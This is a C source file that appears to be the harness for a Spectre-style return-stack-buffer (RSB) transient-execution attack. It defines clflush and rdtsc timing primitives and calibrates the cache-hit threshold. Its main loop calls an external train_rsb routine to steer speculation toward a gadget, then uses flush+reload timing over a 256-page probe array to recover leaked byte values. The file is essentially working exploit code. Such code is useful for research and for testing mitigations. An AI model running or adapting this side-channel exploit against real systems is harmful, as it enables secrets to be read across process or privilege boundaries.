#include <signal.h>
#include <unistd.h>
#include <string.h>
#include <stdio.h>
#include <stdint.h>
#include <stdbool.h>
#include <stdlib.h>
#include <time.h>
#include <signal.h>
#include <setjmp.h>
#include <pthread.h>
#include <sched.h>
#include <sys/mman.h>
// // 
// #include "a.h"

size_t CACHE_MISS = 280;

// ---------------------------------------------------------------------------
__attribute__((always_inline)) inline void flush(void *p) { asm volatile("clflush 0(%0)\n" : : "c"(p) : "rax"); }

// ---------------------------------------------------------------------------
__attribute__((always_inline)) inline void maccess(void *p) { asm volatile("movq (%0), %%rax\n" : : "c"(p) : "rax"); }

void maccess_wr(void *p, int val) { asm volatile("movq %%rax, (%1)\n" : : "a"(val), "c"(p) : ); }

// ---------------------------------------------------------------------------
__attribute__((always_inline)) inline void mfence() { asm volatile("mfence"); }

// ---------------------------------------------------------------------------
__attribute__((always_inline)) inline void lfence() { asm volatile("lfence"); }

__attribute__((always_inline)) inline uint64_t rdtsc() {
    uint64_t a = 0, d = 0;
    asm volatile("mfence");
    asm volatile("rdtsc" : "=a"(a), "=d"(d));
    asm volatile("mfence");

    return (d << 32) | a;
}

void detect_flush_reload_threshold(void){
    register uint64_t t1, t2;
    int i;

    flush(&i);
    mfence();
    t1 = rdtsc();
    mfence();
    maccess(&i);
    mfence();
    t2 = rdtsc() - t1;
    mfence();
    printf("miss latency: %lu\n", t2);

    maccess(&i);
    mfence();
    t1 = rdtsc();
    mfence();
    maccess(&i);
    mfence();
    t2 = rdtsc() - t1;
    mfence();
    printf("hit latency: %lu\n", t2);


}

extern uint8_t gadget();
extern void do_something();
extern char probe_array[256 * 4096];
extern int train_rsb();

int main(int argc, char ** argv){

    detect_flush_reload_threshold();

    // write probe_array to avoid page fault
    for(int i = 0; i < 256; i++){
        probe_array[i * 4096] = 1;
    }

    // check the gadget address
    printf("gadget address: %p\n", gadget);

    while(1){
        int results[256] = {0};
        for(int try = 0; try < 1000; ++try){
            for (size_t i = 0; i < 256; i++) {
                size_t mix_i = ((i * 167) + 13) & 255;
                flush(&probe_array[mix_i * 4096]);
            }

            // mfence();
            // asm volatile("mov $0xfd, %%rax\n" : : : "rax");
            // do_something();
            int c = train_rsb();

            for (size_t i = 0; i < 256; i++) {
                size_t mix_i = ((i * 167) + 13) & 255;
                uint64_t t1 = rdtsc();
                maccess(&probe_array[mix_i * 4096]);
                uint64_t t2 = rdtsc() - t1;
                if (t2 < CACHE_MISS ) {
                    results[mix_i]++;
                }
            }

            // printf("return from rsb: %#x\n", c);
        
        }


        // find max
        int max = 0;
        int idx = 0;
        for(int i = 0; i < 256; ++i){
            if(results[i] > max){
                max = results[i];
                idx = i;
            }
        }

        printf("idx: %x score: %d\n", idx, results[idx]);
        
    }

    return 0;
}


